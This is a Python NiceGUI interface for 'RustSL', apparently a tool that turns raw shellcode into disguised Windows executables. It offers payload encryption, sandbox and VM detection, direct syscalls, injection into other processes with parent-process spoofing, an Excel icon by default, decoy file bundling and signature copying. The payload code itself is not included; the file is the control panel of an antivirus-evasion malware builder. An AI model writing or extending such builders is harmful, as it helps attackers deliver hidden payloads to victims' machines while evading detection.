"""NiceGUI UI components for RustSL."""

import json
from pathlib import Path
from typing import Any, Dict

from nicegui import ui

from config_loader import (
    ROOT,
    _safe_default_id,
    build_feature_maps,
    get_defaults,
    get_encodings,
    load_plugins_manifest,
)
from style import (
    init_styles,
    create_enhanced_group_box,
    create_enhanced_button,
    create_enhanced_textarea,
    create_enhanced_progress,
    add_log_scroll_css,
)
from pipeline import build_rust, copy_output, encrypt_payload, sign_executable


class RustSLWebGUI:
    def __init__(self):
        self.manifest = load_plugins_manifest()
        self.defaults = get_defaults(self.manifest)
        self.encodings = get_encodings(self.manifest)
        self.fmap = build_feature_maps(self.manifest)

        self.state: Dict[str, Any] = {
            "bin_path": "calc.bin",
            "icon_path": "icons/excel.ico",
            "bundle_file": "",
            "sign_app": "",
            "progress": 0,
            "is_building": False,
        }

        self.log_output = None
        self.progress_bar = None
        self.gen_btn = None
        self.payload_address_input = None
        self.run_mode_box = None
        self.target_input = None
        self.pid_input = None
        self.parent_input = None
        self.ppid_checkbox = None
        self.load_payload_box = None
        self.mem_mode_box = None
        self.enc_box = None
        self.encode_box = None
        self.syscall_box = None
        self.target_box = None
        self.vm_checkboxes: Dict[str, Any] = {}
        self.forgery_enable = None
        self.bundle_label = None
        self.sign_enable = None
        self.sign_label = None
        self.icon_label = None
        self.win7_checkbox = None
        self.debug_checkbox = None
        self.build_cmd_display = ""
        self.bin_select = None
        self.icon_select = None
        self.bundle_select = None
        self.sign_select = None

        init_styles()
        self._build_ui()

    # ---------- UI 构建 ----------
    def _build_ui(self):
        with ui.column().classes("w-full max-w-7xl mx-auto p-4 main-container"):
            with ui.row().classes("w-full gap-2 items-stretch"):
                # Left Column
                with ui.column().classes("flex-[1.618] gap-1"):
                    self._create_bin_and_payload_section()
                    self._create_encryption_section()
                    self._create_vm_checks_section()
                    self._create_syscall_section()
                    self._create_mem_mode_section()
                    self._create_run_mode_section()
                    self._create_icon_section()
                    self._create_sign_section()

                # Right Column (Log & Output)
                with ui.column().classes("flex-1 gap-4"):
                    self._create_action_section()
                    self._create_output_download_section()
                    self._create_log_section()

    def _group_box(self, title: str, icon_name: str = None, header_controls=None, classes: str = ""):
        """Helper to create a styled group box similar to QGroupBox."""
        return create_enhanced_group_box(title, icon_name, header_controls, classes)

    # ---------- 文件枚举辅助 ----------
    def _list_files(self, relative_dir: str, exts: tuple[str, ...] | None = None) -> Dict[str, str]:
        base = ROOT / relative_dir
        if not base.exists():
            return {}
        items: Dict[str, str] = {}
        for p in base.iterdir():
            if p.is_file():
                if exts and not p.suffix.lower().endswith(exts):
                    continue
                items[str(p)] = p.name
        return items

    def _delete_output_file(self, path: Path):
        try:
            path.unlink()
            ui.notify(f"Deleted {path.name}", type="positive")
            self._refresh_output_list()
        except Exception as e:
            ui.notify(f"Failed to delete {path.name}: {e}", type="negative")

    def _refresh_output_list(self):
        """Refresh the list of downloadable files in the output directory."""
        if not self.output_container:
            return
        self.output_container.clear()
        output_dir = ROOT / "output"
        if not output_dir.exists():
            with self.output_container:
                ui.label("No output files found.").classes("text-gray-500 italic")
            return

        files = sorted([f for f in output_dir.iterdir() if f.is_file()], key=lambda x: x.stat().st_mtime, reverse=True)
        with self.output_container:
            if not files:
                ui.label("No output files found.").classes("text-gray-500 italic")
            for f in files:
                with ui.row().classes("items-center justify-between w-full p-1 hover:bg-gray-800 rounded border border-gray-700"):
                    ui.label(f.name).classes("font-mono text-xs text-gray-300 truncate flex-1 ml-2")
                    with ui.row().classes("gap-1 mr-1"):
                        ui.button(icon="download", on_click=lambda _, path=f: ui.download(path)).props("flat round dense color=green").tooltip(f"Download {f.name}")
                        ui.button(icon="delete", on_click=lambda _, path=f: self._delete_output_file(path)).props("flat round dense color=red").tooltip(f"Delete {f.name}")

    def _create_bin_and_payload_section(self):
        with ui.row().classes("w-full gap-2 flex-nowrap"):
            with self._group_box("Shellcode", "bin"):
                bin_opts = self._list_files("input")
                if bin_opts:
                    current = self.state["bin_path"]
                    default_bin = next((k for k in bin_opts if k == current or Path(k).name == Path(current).name), next(iter(bin_opts)))
                else:
                    default_bin = "calc.bin"
                with ui.row().classes("w-full items-center gap-1"):
                    self.bin_select = ui.select(options=bin_opts, value=default_bin if bin_opts else None, on_change=self._on_bin_selected).props("dense options-dense").classes("flex-1")

            with self._group_box("Load", "folder"):
                load_modes = self.manifest.get("load_payload_modes", [])
                options = {m["id"]: m.get("label", m["id"]) for m in load_modes}
                default_lp = _safe_default_id(load_modes, self.defaults.get("load_payload_mode"))
                self.load_payload_box = ui.select(options=options, value=default_lp, on_change=self._on_load_payload_changed).props("dense options-dense").classes("w-full")
                self.payload_address_input = ui.input(label="Default payload address", value="encrypt.bin", placeholder="Default payload address").props("dense").classes("w-full")
                self.payload_address_input.visible = (default_lp in ["cmdline", "separate"])

    def _create_encryption_section(self):
        with self._group_box("Encryption/Decryption", "enc"):
            with ui.row().classes("w-full gap-2"):
                enc_items = self.manifest.get("encryption", [])
                enc_opts = {e["id"]: e.get("label", e["id"]) for e in enc_items}
                default_enc = _safe_default_id(enc_items, self.defaults.get("encryption"))
                self.enc_box = ui.select(options=enc_opts, value=default_enc).props("dense options-dense").classes("flex-1")

                encd_items = self.encodings
                encd_opts = {e["id"]: e.get("label", e["id"]) for e in encd_items}
                default_encd = _safe_default_id(encd_items, self.defaults.get("encoding"))
                self.encode_box = ui.select(options=encd_opts, value=default_encd).props("dense options-dense").classes("flex-1")

    def _create_vm_checks_section(self):
        with self._group_box("Sandbox/VM Detection", "pd"):
            vm_items = self.manifest.get("vm_checks", [])
            with ui.row().classes("w-full gap-1 flex-wrap"):
                for item in vm_items:
                    vm_id = item.get("id", "")
                    label = item.get("label", vm_id)
                    self.vm_checkboxes[vm_id] = ui.checkbox(label).props("dense")

    def _create_syscall_section(self):
        with self._group_box("Syscall Method", "run"):
            sc_items = self.manifest.get("syscall_methods", [])
            sc_opts = {s["id"]: s.get("label", s["id"]) for s in sc_items}
            default_sc = _safe_default_id(sc_items, self.defaults.get("syscall_method"))
            self.syscall_box = ui.select(options=sc_opts, value=default_sc).props("dense options-dense").classes("w-full")

    def _create_mem_mode_section(self):
        with self._group_box("Memory Allocation", "mem"):
            mem_items = self.manifest.get("alloc_mem_modes", [])
            mem_opts = {m["id"]: m.get("label", m["id"]) for m in mem_items}
            default_mem = _safe_default_id(mem_items, self.defaults.get("alloc_mem_mode"))
            self.mem_mode_box = ui.select(options=mem_opts, value=default_mem).props("dense options-dense").classes("w-full")

    def _create_run_mode_section(self):
        with self._group_box("Run Mode", "run"):
            rm_items = self.manifest.get("run_modes", [])
            rm_opts = {r["id"]: r.get("label", r["id"]) for r in rm_items}
            default_rm = _safe_default_id(rm_items, self.defaults.get("run_mode"))
            self.run_mode_box = ui.select(options=rm_opts, value=default_rm, on_change=self._on_run_mode_changed).props("dense options-dense").classes("w-full")

            with ui.row():
                self.target_input = ui.input(label="Target program path", value="notepad.exe", placeholder="e.g., C:/Windows/System32/notepad.exe").props("dense").classes("flex-1")
                self.parent_input = ui.input(label="Parent process name", value="explorer.exe", placeholder="e.g., explorer.exe").props("dense").classes("flex-1")
                self.ppid_checkbox = ui.checkbox(value=False).classes("ml-4")
            self.target_input.visible = False
            self.parent_input.visible = False
            self.ppid_checkbox.visible = False
            self.pid_input = ui.input(label="Target process ID", value="0", placeholder="e.g., 1234").props("dense").classes("w-full")
            self.pid_input.visible = False
            self._on_run_mode_changed(type("obj", (), {"value": default_rm}))

    def _create_icon_section(self):
        with ui.row().classes("w-full gap-2 flex-nowrap"):
            with self._group_box("Icon File", "bundle"):
                icon_opts = self._list_files("icons", (".ico",))
                if icon_opts:
                    current = self.state["icon_path"]
                    preferred_name = "excel.ico"
                    default_icon = next((k for k in icon_opts if k == current or Path(k).name == Path(current).name), None)
                    if not default_icon:
                        default_icon = next((k for k in icon_opts if Path(k).name == preferred_name), next(iter(icon_opts)))
                else:
                    default_icon = "icons/excel.ico"
                with ui.row().classes("w-full items-center gap-1"):
                    self.icon_select = ui.select(options=icon_opts, value=default_icon if icon_opts else None, on_change=self._on_icon_selected).props("dense options-dense").classes("flex-1")

            with self._group_box("File Bundling", "bundle"):
                with ui.row().classes("w-full items-center gap-1"):
                    bundle_opts = self._list_files("bundle")
                    default_bundle = next(iter(bundle_opts), None)
                    self.bundle_select = ui.select(options=bundle_opts, on_change=self._on_bundle_selected, value=default_bundle).props("dense options-dense").classes("flex-1")
                    self.bundle_select.props("disable")
                    self.forgery_enable = ui.checkbox("", on_change=self._on_forgery_changed).props("dense")

    def _create_sign_section(self):
        with ui.row().classes("w-full gap-2 flex-nowrap"):
            with self._group_box("Target", "target"):
                targets = {
                    "x86_64-pc-windows-msvc": "Windows MSVC (x64)",
                    "x86_64-pc-windows-gnu": "Windows GNU (x64)",
                }
                self.target_box = ui.select(options=targets, value="x86_64-pc-windows-msvc").props("dense options-dense").classes("w-full")

            with self._group_box("Signature", "exe"):
                with ui.row().classes("w-full items-center gap-1"):
                    sign_opts = self._list_files("sign/app", (".exe",))
                    default_sign = next(iter(sign_opts), None)
                    self.sign_select = ui.select(options=sign_opts, value=default_sign, on_change=self._on_sign_selected).props("dense options-dense").classes("flex-1")
                    self.sign_select.props("disable")
                    self.sign_enable = ui.checkbox("", on_change=self._on_sign_changed).props("dense")

    def _create_action_section(self):
        with self._group_box("Action"):
            with ui.column().classes("w-full gap-4"):
                with ui.row().classes("w-full gap-4 items-center"):
                    with ui.column().classes("flex-[1] gap-2 justify-center"):
                        self.win7_checkbox = ui.checkbox("Win7")
                        self.debug_checkbox = ui.checkbox("Debug")
                    
                    with create_enhanced_button(on_click=self.run_all, style='icon').classes("flex-[1.618] h-[100px] w-auto p-0") as self.gen_btn:
                        self.gen_btn_img = ui.image("icons/rocket.ico").classes("w-[80px] h-[80px]")
                        self.gen_btn.tooltip("Generate Payload")
                
                self.progress_bar = create_enhanced_progress(value=0).props("stripe rounded size=20px color=blue-5 track-color=grey-3").classes("w-full mt-2")

    def _create_log_section(self):
        with self._group_box("Build Log", classes="flex-grow") as container:
            container.classes("flex-grow h-full")
            self.log_output = create_enhanced_textarea(value="", classes="w-full h-full log-area").props("readonly spellcheck=false input-style='height: 100% !important; resize: none;'")
            self.log_output.style("background-color: #1a1a1a; color: #4ade80;") # Force styles for textarea content

    def _create_output_download_section(self):
        def header_btn():
             ui.button(icon="refresh", on_click=self._refresh_output_list).props("flat round dense size=sm color=white").tooltip("Refresh list")

        with self._group_box("Output Files", "folder", header_controls=header_btn):
            self.output_container = ui.column().classes("w-full gap-1 h-[150px] overflow-y-auto pr-2")
            self._refresh_output_list()

    # ---------- 事件处理 ----------
    def _on_load_payload_changed(self, e):
        self.payload_address_input.visible = (e.value in ["cmdline", "separate"])

    def _on_forgery_changed(self, e):
        # Enable/Disable dropdown
        if self.bundle_select:
            if e.value:
                self.bundle_select.props(remove="disable")
            else:
                self.bundle_select.props("disable")

    def _on_sign_changed(self, e):
        # Enable/Disable dropdown
        if self.sign_select:
            if e.value:
                self.sign_select.props(remove="disable")
            else:
                self.sign_select.props("disable")

    def _on_run_mode_changed(self, e):
        run_mode_id = e.value
        pattern = 1
        for rm in self.manifest.get("run_modes", []):
            if rm.get("id") == run_mode_id:
                pattern = rm.get("pattern", 1)
                break
        self.target_input.visible = (pattern == 2)
        self.parent_input.visible = (pattern == 2)
        self.ppid_checkbox.visible = (pattern == 2)
        self.pid_input.visible = (pattern == 3)

    def _on_bin_selected(self, e):
        if e.value:
            self.state["bin_path"] = e.value

    def _on_icon_selected(self, e):
        if e.value:
            self.state["icon_path"] = e.value

    def _on_bundle_selected(self, e):
        if e.value:
            self.state["bundle_file"] = e.value

    def _on_sign_selected(self, e):
        if e.value:
            self.state["sign_app"] = e.value

    # ---------- 辅助 ----------
    def _log(self, text: str):
        self.log_output.value += text + "\n"
        ui.run_javascript(f"document.querySelector('.log-area textarea').scrollTop = document.querySelector('.log-area textarea').scrollHeight;")

    def _collect_params(self) -> Dict[str, Any]:
        vm_selected = [vid for vid, cb in self.vm_checkboxes.items() if cb.value]
        vm_checks = ",".join(vm_selected)
        load_mode = self.load_payload_box.value or _safe_default_id(self.manifest.get("load_payload_modes", []), self.defaults.get("load_payload_mode"))
        
        # Use values directly from UI components to ensure defaults are captured
        bin_path = self.bin_select.value if self.bin_select else self.state["bin_path"]
        icon_path = self.icon_select.value if self.icon_select else self.state["icon_path"]
        bundle_file = self.bundle_select.value if self.bundle_select else self.state["bundle_file"]
        sign_app = self.sign_select.value if self.sign_select else self.state["sign_app"]

        return {
            "input_bin": bin_path or "calc.bin",
            "run_mode": self.run_mode_box.value,
            "vm_checks": vm_checks,
            "enc_method": self.enc_box.value,
            "encode_method": self.encode_box.value,
            "icon_path": icon_path or "icons/excel.ico",
            "sign_enable": self.sign_enable.value,
            "sign_app": sign_app,
            "forgery_enable": self.forgery_enable.value,
            "bundle_file": bundle_file,
            "mem_mode": self.mem_mode_box.value,
            "load_payload_mode": load_mode,
            "default_payload_address": self.payload_address_input.value if self.payload_address_input.visible else "",
            "target": self.target_box.value,
            "target_program": self.target_input.value if self.target_input.visible else "",
            "parent_process_name": self.parent_input.value if self.parent_input.visible else "",
            "enable_ppid_spoofing": self.ppid_checkbox.value if self.ppid_checkbox.visible else False,
            "target_pid": self.pid_input.value if self.pid_input.visible else "0",
            "syscall_method": self.syscall_box.value,
            "win7_compat": self.win7_checkbox.value,
            "debug_mode": self.debug_checkbox.value,
        }

    # ---------- 总流程 ----------
    async def run_all(self):
        if self.state["is_building"]:
            ui.notify("Build already in progress", type="warning")
            return

        self.state["is_building"] = True
        self.gen_btn.enabled = False
        self.gen_btn_img.set_source("icons/loading.gif")
        self.progress_bar.value = 0
        self.log_output.value = ""

        build_cmd_display = ""
        try:
            params = self._collect_params()
            self._log("=== RustSL Build Started ===")
            self._log(json.dumps(params, indent=2, ensure_ascii=False))

            await encrypt_payload(params, self.fmap, self._log, lambda v: setattr(self.progress_bar, "value", v / 100 if v > 1 else v))
            build_cmd_display = await build_rust(params, self.manifest, self.fmap, self._log, lambda v: setattr(self.progress_bar, "value", v / 100 if v > 1 else v))

            self._log("Copying output...")
            dst_file = copy_output(params)
            self._log(f"Output: {dst_file}")
            self.progress_bar.value = 0.9

            self._refresh_output_list()
            if params.get("sign_enable"):
                if not params.get("sign_app"):
                    raise ValueError("Signature enabled but no source file selected")
                await sign_executable(dst_file, params["sign_app"], self._log, lambda v: setattr(self.progress_bar, "value", v / 100 if v > 1 else v))

            self.progress_bar.value = 1.0
            self._log("=== Build Completed ===")
            ui.notify("Build completed", type="positive")

        except Exception as e:
            err_text = str(e)
            if not err_text:
                err_text = repr(e)
            if not err_text:
                err_text = "Unexpected error"
            if build_cmd_display and "To debug" not in err_text:
                err_text = f"{err_text}\nTo debug, run: {build_cmd_display}"
            self._log(f"[Error] {err_text}")
            ui.notify(err_text, type="negative")
        finally:
            self.state["is_building"] = False
            self.gen_btn.enabled = True
            self.gen_btn_img.set_source("icons/rocket.ico")
